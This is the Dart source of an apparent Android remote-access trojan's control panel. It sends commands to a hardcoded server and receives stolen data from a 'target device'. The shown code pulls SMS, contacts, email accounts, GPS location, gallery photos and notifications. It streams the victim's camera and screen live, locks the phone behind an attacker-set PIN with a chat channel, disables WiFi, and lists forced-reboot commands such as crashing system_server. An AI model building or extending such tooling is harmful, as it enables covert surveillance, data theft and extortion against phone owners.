import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Elegant Red Theme
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  // ── Elegant Theme Constants ────────────────────────────────────────────────
  static const _kBase  = 'http://senzlinodepriv.senzhosting.my.id:10791';
  static const _kBg    = Color(0xFF0D0D0D);      // Dark elegant background
  static const _kCard  = Color(0xFF1A1A1A);      // Subtle card background
  static const _kBorder = Color(0xFF2A2A2A);     // Border color
  static const _kText  = Color(0xFFF5F5F5);      // Primary text
  static const _kTextSecondary = Color(0xFF9E9E9E); // Secondary text
  static const _kAccent = Color(0xFFE53935);     // Red accent
  static const _kSuccess = Color(0xFF4CAF50);    // Success green
  static const _kWarning = Color(0xFFFF9800);    // Warning orange
  static const _kPurple = Color(0xFF9C27B0);     // Purple for gallery
  static const _kCyan   = Color(0xFF00BCD4);     // Cyan for screen

  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _kAccent}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c,
      content: Text(m, style: const TextStyle(fontWeight: FontWeight.w500, fontSize: 13)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('Invalid target ID'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Command sent', c: _kSuccess);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Connection failed'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('No photo'); return; }
        _addLog('Photo received');
        _imgDialog(b, 'Captured Photo');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot received');
        _imgDialog(b, 'Screen Capture');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS received');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} contacts');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Accounts received');
        _textDialog('Accounts & Emails', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} gallery photos');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd completed');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'Front Camera' : 'Rear Camera')
          : 'Screen Mirror';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live stream stopped');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _kBg,
      appBar: AppBar(
        backgroundColor: _kCard,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, color: _kText, size: 18),
          onPressed: () { if (_liveOn) _stopLive(); Navigator.pop(context); }),
        title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(_model, style: const TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.w600)),
          Row(children: [
            Container(width: 6, height: 6, decoration: BoxDecoration(color: _liveOn ? _kAccent : _kTextSecondary, shape: BoxShape.circle)),
            const SizedBox(width: 6),
            Text('Battery: $_battery%  •  $_id',
                style: const TextStyle(color: _kTextSecondary, fontSize: 10), overflow: TextOverflow.ellipsis),
          ]),
        ]),
        actions: [
          if (_liveOn) Container(
            margin: const EdgeInsets.symmetric(vertical: 14, horizontal: 4),
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
            decoration: BoxDecoration(color: _kAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(4), border: Border.all(color: _kAccent.withOpacity(0.3))),
            child: Text('$_fps fps', style: TextStyle(color: _kAccent, fontSize: 10, fontWeight: FontWeight.w600)),
          ),
          if (_sending) const Padding(padding: EdgeInsets.only(right: 12),
            child: SizedBox(width: 16, height: 16,
                child: CircularProgressIndicator(strokeWidth: 1.5, valueColor: AlwaysStoppedAnimation(_kAccent)))),
          IconButton(icon: const Icon(Icons.refresh, color: _kTextSecondary, size: 20),
            onPressed: () { setState(() {}); _cmd('force_open', silent: true); }),
        ],
        bottom: TabBar(
          controller: _tabs,
          isScrollable: true,
          indicatorColor: _kAccent,
          indicatorWeight: 2,
          indicatorSize: TabBarIndicatorSize.label,
          labelColor: _kText,
          unselectedLabelColor: _kTextSecondary,
          labelStyle: const TextStyle(fontSize: 12, fontWeight: FontWeight.w500, letterSpacing: 0.3),
          unselectedLabelStyle: const TextStyle(fontSize: 12),
          tabs: const [
            Tab(text: 'LIVE'),
            Tab(text: 'CAMERA'),
            Tab(text: 'DATA'),
            Tab(text: 'AUDIO'),
            Tab(text: 'CHAT'),
            Tab(text: 'DEVICE'),
          ],
        ),
      ),
      body: Column(children: [
        // Activity log bar
        Container(
          height: 48,
          margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
          padding: const EdgeInsets.fromLTRB(12, 8, 12, 8),
          decoration: BoxDecoration(
            color: _kCard,
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: _kBorder, width: 0.5),
          ),
          child: _log.isEmpty
              ? const Center(child: Text('No activity', style: TextStyle(color: _kTextSecondary, fontSize: 10)))
              : ListView.builder(
                  scrollDirection: Axis.horizontal,
                  itemCount: _log.length,
                  itemBuilder: (_, i) => Padding(
                    padding: const EdgeInsets.only(right: 12),
                    child: Text(_log[i], style: const TextStyle(color: _kTextSecondary, fontSize: 9, fontFamily: 'monospace')),
                  )),
        ),
        Expanded(child: TabBarView(controller: _tabs, children: [
          _pageLive(),
          _pageCamera(),
          _pageIntel(),
          _pageAudio(),
          _pageLock(),
          _pageDevice(),
        ])),
      ]),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(16), children: [
    _sectionHeader('Live Stream', 'Real-time camera and screen capture'),
    const SizedBox(height: 12),
    // Preview
    Container(
      height: _liveOn ? 240 : 100,
      decoration: BoxDecoration(
        color: _kBg,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _liveOn ? _kAccent.withOpacity(0.4) : _kBorder, width: 0.5)),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(11),
        child: _liveOn && _frame != null
            ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true)
            : Center(child: Text(_liveOn ? 'Connecting...' : 'Stream inactive',
                style: const TextStyle(color: _kTextSecondary, fontSize: 12))),
      ),
    ),
    const SizedBox(height: 16),
    Row(children: [
      Expanded(child: _actionBtn('Camera', _kAccent, Icons.videocam, () {
        _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); });
      })),
      const SizedBox(width: 12),
      Expanded(child: _actionBtn('Screen', _kCyan, Icons.phone_android, () {
        _startLive('live_screen_start', ''); _showLiveDialog();
      })),
    ]),
    if (_liveOn) ...[
      const SizedBox(height: 12),
      _actionBtn('Stop Stream', _kTextSecondary, Icons.stop, _stopLive),
    ],
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: CAMERA
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageCamera() => ListView(padding: const EdgeInsets.all(16), children: [
    _sectionHeader('Camera', 'Capture photos and manage visual content'),
    const SizedBox(height: 12),
    _actionBtn('Take Photo',   _kAccent,  Icons.camera_alt,      () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
    _gap,
    _actionBtn('Screenshot',   _kCyan,    Icons.screenshot,       () => _cmd('get_screen')),
    _gap,
    _actionBtn('Set Wallpaper', _kPurple, Icons.wallpaper,        () => _inputDialog('Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))),
    _gap,
    Row(children: [
      Expanded(child: _actionBtn('Flash On',  _kWarning, Icons.flash_on,  () => _cmd('flash_strobe'))),
      const SizedBox(width: 12),
      Expanded(child: _actionBtn('Flash Off', _kTextSecondary, Icons.flash_off, () => _cmd('stop_strobe'))),
    ]),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: INTELLIGENCE (DATA)
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(16), children: [
    _sectionHeader('Data Collection', 'Extract information from target device'),
    const SizedBox(height: 12),
    _actionBtn('Contacts',          _kAccent,  Icons.contacts,         () => _cmd('get_contacts')),
    _gap,
    _actionBtn('Location',          _kSuccess, Icons.location_on,      () => _cmd('get_location')),
    _gap,
    _actionBtn('Accounts',          _kAccent,  Icons.email,            () => _cmd('get_gmails')),
    _gap,
    _actionBtn('SMS Messages',      _kCyan,    Icons.chat_bubble,      () => _cmd('get_sms')),
    _gap,
    _actionBtn('Notifications',     _kPurple,  Icons.notifications,    () => _fetchNotif()),
    _gap,
    _actionBtn('Gallery',           _kPurple,  Icons.photo_library,    () => _cmd('get_gallery', extra: '5')),
    _gap,
    _actionBtn('Permission Helper', _kTextSecondary, Icons.security,   () => _cmd('open_notification_settings')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: AUDIO
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(16), children: [
    _sectionHeader('Audio & Network', 'Control audio playback and connectivity'),
    const SizedBox(height: 12),
    _actionBtn('Play Audio',   _kWarning, Icons.play_circle,  () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
    _gap,
    _actionBtn('Stop Audio',   _kTextSecondary, Icons.stop_circle,  () => _cmd('stop_audio')),
    _gap,
    _actionBtn('Vibrate',      _kPurple, Icons.vibration,    () => _cmd('vibrate_loop')),
    _gap,
    _actionBtn('Open URL',     _kCyan, Icons.link,      () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))),
    _gap,
    _actionBtn('Disable WiFi', _kAccent, Icons.wifi_off,     () => _cmd('kill_wifi')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LOCK & CHAT
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLock() => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(16), children: [
      _sectionHeader('Remote Lock', 'Secure the device and communicate'),
      const SizedBox(height: 12),

      // Lock section
      _actionBtn('Lock + Chat', _kAccent, Icons.lock, () {
        _lockLiveDialog();
      }),
      _gap,
      _actionBtn('Lock Device', _kWarning, Icons.lock_outline, () {
        _inputDialog('Lock Device', 'Lock screen message', (msg) {
          _inputDialog('Unlock PIN', 'Set 4-digit PIN', (pin) {
            _cmd('hard_lock', extra: '$msg|$pin');
          }, isNumber: true, hint: '1234');
        });
      }),
      _gap,
      _actionBtn('Unlock Device', _kSuccess, Icons.lock_open, () => _cmd('unlock')),
      const SizedBox(height: 24),

      // Chat section
      _sectionHeader('Chat', 'Send messages to target device'),
      const SizedBox(height: 12),
      Container(
        height: 220,
        decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBorder, width: 0.5)),
        child: _chat.isEmpty
            ? const Center(child: Text('No messages', style: TextStyle(color: _kTextSecondary, fontSize: 12)))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.all(12),
                itemCount: _chat.length,
                itemBuilder: (_, i) {
                  final m = _chat[i];
                  final isOwner = m['from'] == 'owner';
                  return Align(
                    alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                    child: Container(
                      margin: const EdgeInsets.symmetric(vertical: 4),
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
                      decoration: BoxDecoration(
                        color: isOwner ? _kAccent.withOpacity(0.85) : Colors.transparent,
                        borderRadius: BorderRadius.circular(16),
                        border: isOwner ? null : Border.all(color: _kBorder, width: 0.5),
                      ),
                      child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                        Text(m['text'] ?? '', style: const TextStyle(color: _kText, fontSize: 13)),
                        const SizedBox(height: 2),
                        Text(m['time'] ?? '', style: const TextStyle(color: _kTextSecondary, fontSize: 9)),
                      ]),
                    ),
                  );
                }),
      ),
    ])),
    // Chat input bar
    Container(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 12),
      decoration: BoxDecoration(color: _kCard, border: Border(top: BorderSide(color: _kBorder, width: 0.5))),
      child: Row(children: [
        Expanded(child: TextField(
          controller: _chatCtrl,
          style: const TextStyle(color: _kText, fontSize: 14),
          decoration: InputDecoration(
            hintText: 'Type a message...',
            hintStyle: const TextStyle(color: _kTextSecondary, fontSize: 13),
            filled: true,
            fillColor: _kBg,
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(24), borderSide: BorderSide.none),
          ),
          onSubmitted: _sendChat,
        )),
        const SizedBox(width: 10),
        GestureDetector(
          onTap: () => _sendChat(_chatCtrl.text),
          child: Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: _kAccent, shape: BoxShape.circle),
            child: const Icon(Icons.send, color: Colors.white, size: 18)),
        ),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: DEVICE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(16), children: [
    _sectionHeader('Device Control', 'System-level device management'),
    const SizedBox(height: 12),
    _actionBtn('Restart Device', _kWarning, Icons.power_settings_new, () {
      showDialog(context: context, builder: (_) => AlertDialog(
        backgroundColor: _kCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: const Text('Restart Device', style: TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w600)),
        content: const Text(
          'The target device will be restarted.',
          style: TextStyle(color: _kTextSecondary, fontSize: 13, height: 1.5)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kTextSecondary))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: _kWarning, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
            onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
            child: const Text('Restart', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
        ],
      ));
    }),
    _gap,
    _actionBtn('Wake Device', _kSuccess, Icons.brightness_5, () => _cmd('force_open')),
    const SizedBox(height: 20),
    Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBorder, width: 0.5)),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        const Text('Restart Methods', style: TextStyle(color: _kText, fontSize: 12, fontWeight: FontWeight.w600)),
        const SizedBox(height: 10),
        _infoRow('1', 'PowerManager reflection (no root)'),
        _infoRow('2', 'DevicePolicyManager (admin)'),
        _infoRow('3', 'su -c reboot (root)'),
        _infoRow('4', 'am crash system_server'),
        _infoRow('5', 'pkill -9 zygote'),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // DIALOGS
  // ─────────────────────────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: _kCard,
          insetPadding: const EdgeInsets.all(8),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(color: _kCard, borderRadius: const BorderRadius.vertical(top: Radius.circular(16)), border: const Border(bottom: BorderSide(color: _kBorder))),
              child: Row(children: [
                Container(width: 8, height: 8, decoration: BoxDecoration(color: _kAccent, shape: BoxShape.circle)),
                const SizedBox(width: 10),
                Text('LIVE · $_liveTitle', style: const TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                  decoration: BoxDecoration(color: _kSuccess.withOpacity(0.1), borderRadius: BorderRadius.circular(4), border: Border.all(color: _kSuccess.withOpacity(0.3))),
                  child: Text('$_fps fps', style: const TextStyle(color: _kSuccess, fontSize: 10, fontWeight: FontWeight.w600))),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.55),
              color: _kBg,
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true)
                  : const SizedBox(height: 200, child: Center(child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2))),
            ),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: const BoxDecoration(color: _kCard, borderRadius: BorderRadius.vertical(bottom: Radius.circular(16))),
              child: Row(children: [
                Expanded(child: OutlinedButton.icon(
                  style: OutlinedButton.styleFrom(side: BorderSide(color: _kBorder), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
                  icon: const Icon(Icons.cameraswitch, color: _kTextSecondary, size: 16),
                  label: const Text('Switch', style: TextStyle(color: _kTextSecondary, fontSize: 12)),
                  onPressed: () {
                    final isFront = _liveTitle.contains('Front');
                    _stopLive();
                    Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                  },
                )),
                const SizedBox(width: 10),
                Expanded(child: ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
                  icon: const Icon(Icons.stop, color: Colors.white, size: 16),
                  label: const Text('Stop', style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
                  onPressed: () { _stopLive(); Navigator.pop(ctx); },
                )),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: const Text('Lock + Chat', style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.w600)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        const Text('Lock device and enable two-way chat', style: TextStyle(color: _kTextSecondary, fontSize: 12)),
        const SizedBox(height: 14),
        _field(msgCtrl, 'Lock message', hint: 'Device locked by administrator'),
        const SizedBox(height: 12),
        _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kTextSecondary))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () {
            Navigator.pop(context);
            final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED' : msgCtrl.text.trim();
            final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
            _cmd('lock_live', extra: '$msg|$pin');
          },
          child: const Text('LOCK', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: _kCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: const Text('Select Camera', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
          final isSel = sel == v;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
              decoration: BoxDecoration(
                color: isSel ? _kAccent.withOpacity(0.1) : Colors.transparent,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: isSel ? _kAccent : _kBorder, width: 0.5)),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear : Icons.camera_front, color: isSel ? _kAccent : _kTextSecondary, size: 28),
                const SizedBox(height: 6),
                Text(v == 'back' ? 'Rear' : 'Front', style: TextStyle(color: isSel ? _kAccent : _kTextSecondary, fontSize: 12)),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Cancel', style: TextStyle(color: _kTextSecondary))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
            onPressed: () { Navigator.pop(ctx); onPick(sel); },
            child: const Text('Select', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: Text(title, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
      content: _field(ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: _kTextSecondary))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
          child: const Text('Send', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
      ],
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(context: context, backgroundColor: _kCard,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
          builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
            builder: (_, sc) => Column(children: [
              Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
              const Text('Notifications', style: TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
              const SizedBox(height: 8),
              Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 16),
                itemCount: list.length, separatorBuilder: (_, __) => Divider(color: _kBorder, height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(width: 40, height: 40, decoration: BoxDecoration(color: _kPurple.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                    child: const Icon(Icons.notifications, color: _kPurple, size: 20)),
